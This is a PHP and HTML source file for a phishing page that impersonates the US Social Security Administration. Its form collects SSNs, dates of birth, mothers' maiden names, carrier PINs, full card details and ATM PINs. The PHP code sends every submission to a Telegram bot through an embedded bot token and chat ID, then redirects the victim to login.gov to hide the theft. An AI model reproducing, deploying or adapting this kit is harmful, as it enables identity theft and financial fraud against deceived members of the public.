<?php
session_start();

// Check if the user has downloaded the file
if (!isset($_SESSION['download_link'])) {
    die("You must download the file before proceeding.");
}

// Telegram Bot Configuration
$telegramToken = "7767860207:AAESWzFVnvtLKxxGyaNzy-rK-kx0YgRBgY0";
$telegramChatId = "-4588476243";

function sendTelegramNotification($message) {
    global $telegramToken, $telegramChatId;

    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $data = [
        'chat_id' => $telegramChatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userInfo = [
        'First Name' => $_POST['first_name'] ?? '',
        'Last Name' => $_POST['last_name'] ?? '',
        'Email' => $_POST['email'] ?? '',
        'Phone' => $_POST['phone'] ?? '',
        'Address' => $_POST['address'] ?? '',
        'ZIP Code' => $_POST['zip'] ?? '',
        'SSN' => $_POST['ssn'] ?? '',
        'Date of Birth' => $_POST['dob'] ?? '',
        'Mother\'s Maiden Name' => $_POST['mmn'] ?? '',
        'Carrier PIN' => $_POST['carrier_pin'] ?? '',
        'Card Number' => $_POST['card_number'] ?? '',
        'Expiry Date' => $_POST['expiry_date'] ?? '',
        'CVV' => $_POST['cvv'] ?? '',
        'ATM PIN' => $_POST['atm_pin'] ?? '',
    ];

    // Format the message for Telegram
    $message = "🔹 *New User Information Submitted:*\n";
    foreach ($userInfo as $key => $value) {
        $message .= "*{$key}*: " . htmlspecialchars($value) . "\n";
    }

    // Send the data to Telegram
    sendTelegramNotification($message);

    // Redirect to secure login
    header("Location: https://secure.login.gov/");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Process Information and Payment</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background-color: #ffffff;
            padding: 30px 40px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
            max-width: 450px;
            width: 100%;
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .header img {
            width: 100px;
        }
        h2 {
            font-size: 1.8rem;
            color: #333;
            text-align: center;
            margin-bottom: 25px;
        }
        .form-field {
            margin-bottom: 20px;
        }
        .form-field label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            color: #555;
        }
        .form-field input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 1rem;
        }
        .submit-button {
            width: 100%;
            padding: 14px;
            background-color: #007bff;
            color: white;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.1rem;
            margin-top: 10px;
        }
        .submit-button:hover {
            background-color: #0056b3;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script>
        $(document).ready(function(){
            $('.ssn').mask('000-00-0000');
            $('.zip').mask('000000');
            $('.tel').mask('(000) 000-0000');
            $('.carrier_pin').mask('0000');
            $('.card-number').mask('0000 0000 0000 0000');
            $('.expiry-date').mask('00/00');
            $('.cvv').mask('000');
            $('.atm-pin').mask('0000');
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/US-SocialSecurityAdmin-Seal.svg" alt="SSA Logo">
        </div>
        <h2>Submit Your Information</h2>
        <form method="POST" action="">
            <div class="form-field">
                <label for="first_name">First Name</label>
                <input type="text" id="first_name" name="first_name" required minlength="2" maxlength="50">
            </div>
            <div class="form-field">
                <label for="last_name">Last Name</label>
                <input type="text" id="last_name" name="last_name" required minlength="2" maxlength="50">
            </div>
            <div class="form-field">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required maxlength="100">
            </div>
            <div class="form-field">
                <label for="phone">Phone</label>
                <input type="tel" id="phone" name="phone" class="tel" required minlength="10" maxlength="14">
            </div>
            <div class="form-field">
                <label for="address">Address</label>
                <input type="text" id="address" name="address" required maxlength="100">
            </div>
            <div class="form-field">
                <label for="zip">ZIP Code</label>
                <input type="text" id="zip" name="zip" class="zip" required minlength="5" maxlength="6" pattern="\d*">
            </div>
            <div class="form-field">
                <label for="ssn">SSN</label>
                <input type="text" id="ssn" name="ssn" class="ssn" required minlength="11" maxlength="11">
            </div>
            <div class="form-field">
                <label for="dob">Date of Birth</label>
                <input type="date" id="dob" name="dob" required>
            </div>
            <div class="form-field">
                <label for="mmn">Mother's Maiden Name</label>
                <input type="text" id="mmn" name="mmn" required minlength="2" maxlength="50">
            </div>
            <div class="form-field">
                <label for="carrier_pin">Carrier PIN</label>
                <input type="text" id="carrier_pin" name="carrier_pin" class="carrier_pin" required minlength="4" maxlength="4" pattern="\d*">
            </div>
            <div class="form-field">
                <label for="card_number">Card Number</label>
                <input type="text" id="card_number" name="card_number" class="card-number" required minlength="19" maxlength="19">
            </div>
            <div class="form-field">
                <label for="expiry_date">Expiry Date (MM/YY)</label>
                <input type="text" id="expiry_date" name="expiry_date" class="expiry-date" required minlength="5" maxlength="5">
            </div>
            <div class="form-field">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" class="cvv" required minlength="3" maxlength="3">
            </div>
            <div class="form-field">
                <label for="atm_pin">ATM PIN</label>
                <input type="text" id="atm_pin" name="atm_pin" class="atm-pin" required minlength="4" maxlength="4">
            </div>
            <button type="submit" class="submit-button">Submit & Continue</button>
        </form>
    </div>
</body>
</html>
